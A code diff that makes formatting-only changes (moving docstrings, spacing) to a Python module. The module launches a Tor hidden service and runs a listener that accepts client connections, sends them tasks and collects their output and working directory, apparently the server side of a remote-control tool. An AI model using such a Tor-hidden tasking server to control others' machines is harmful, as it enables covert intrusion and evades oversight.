@@ -7,11 +7,12 @@ import subprocess as sp
 import stem.process
 import stat
 
-"""
-A class to handle the tor process,
-and the tor hidden service.
-"""
+
 class Tor(Style):
+    """
+    A class to handle the tor process,
+    and the tor hidden service.
+    """
     BASE_DIR = 'hidden_service'
     TORRC_PATH = os.path.join('hidden_service', 'torrc')
     TOR_SOCKS_PORT = 9200
@@ -32,15 +33,15 @@ class Tor(Style):
         self.process = self.launch()
         self.posSysMsg('Onion: {}'.format(self.getOnionAddress()))
 
-    def launch(self) -> sp.Popen:
+    def launch(self):
         try:
             self.torProcess = stem.process.launch_tor_with_config(
-                config = {
-                    'SocksListenAddress'   : '127.0.0.1:{}'.format(self.TOR_SOCKS_PORT),
-                    'SocksPort'            : '{}'.format(self.TOR_SOCKS_PORT),
-                    'HiddenServiceDir'     : '{}'.format(self.BASE_DIR),
-                    'HiddenServiceVersion' : '3',
-                    'HiddenServicePort'    : '{} 127.0.0.1:{}'.format(self.lPort, self.fPort)
+                config={
+                    'SocksListenAddress': '127.0.0.1:{}'.format(self.TOR_SOCKS_PORT),
+                    'SocksPort': '{}'.format(self.TOR_SOCKS_PORT),
+                    'HiddenServiceDir': '{}'.format(self.BASE_DIR),
+                    'HiddenServiceVersion': '3',
+                    'HiddenServicePort': '{} 127.0.0.1:{}'.format(self.lPort, self.fPort)
                 })
         except Exception as error:
             self.negSysMsg('Error while starting tor: {}'.format(error))
@@ -54,11 +55,11 @@ class Tor(Style):
             return f.read().rstrip()
 
 
-"""
-A class to handle the listener socket.
-It also handles the en- and decoding and the network protocoll.
-"""
 class ListenerSocket(Style, threading.Thread):
+    """
+    A class to handle the listener socket.
+    It also handles the en- and decoding and the network protocoll.
+    """
     MAX_CONNECTIONS = 10
 
     def __init__(self, port):
@@ -82,13 +83,14 @@ class ListenerSocket(Style, threading.Thread):
         else:
             self.posSysMsg('Created socket and bound to hidden service forward port')
             return sock
-    """
-    The <start> method runs as a thread and endless.
-    It handles all incoming client connections and stores the according 
-    client objects in <self.__clients>. 
-    """
+
     def run(self):
-        self.posSysMsg('Listening for clients') 
+        """
+        The <start> method runs as a thread and endless.
+        It handles all incoming client connections and stores the according
+        client objects in <self.__clients>.
+        """
+        self.posSysMsg('Listening for clients')
         while True:
             try:
                 clientObjects = self.__sock.accept()
@@ -113,25 +115,27 @@ class ListenerSocket(Style, threading.Thread):
 
     def delClient(self, index):
         try:
-            del(self.__clients[index])
+            del (self.__clients[index])
         except IndexError:
             self.negSysMsg('Client Index out of range.')
 
-"""
-A class the handles the interaction between the listener and the client.
-It should NOT be accessed from outside the module.
-"""
+
 class Client(Style):
+    """
+    A class the handles the interaction between the listener and the client.
+    It should NOT be accessed from outside the module.
+    """
+
     def __init__(self, clientObjects):
         self.__conn, self.__addr = clientObjects
 
-    """
-    The Listener always sends a dictionary containing, 
-    A task and a list of optional arguments.
-    """
     def send(self, task, args):
+        """
+        The Listener always sends a dictionary containing,
+        A task and a list of optional arguments.
+        """
         try:
-            data = {'task' : task, 'args' : args}
+            data = {'task': task, 'args': args}
             data = str(data)
             self.__conn.send(data.encode('utf-8'))
         except socket.error as error:
@@ -140,11 +144,11 @@ class Client(Style):
         else:
             self.posSysMsg('==> send {} bytes'.format(sys.getsizeof(data)))
 
-    """
-    The client always sends back the output of the current task, 
-    and the current working directory as a dictionary.
-    """
     def receive(self, buffersize):
+        """
+        The client always sends back the output of the current task,
+        and the current working directory as a dictionary.
+        """
         try:
             data = self.__conn.recv(buffersize)
             # get length in bytes before unpacking data
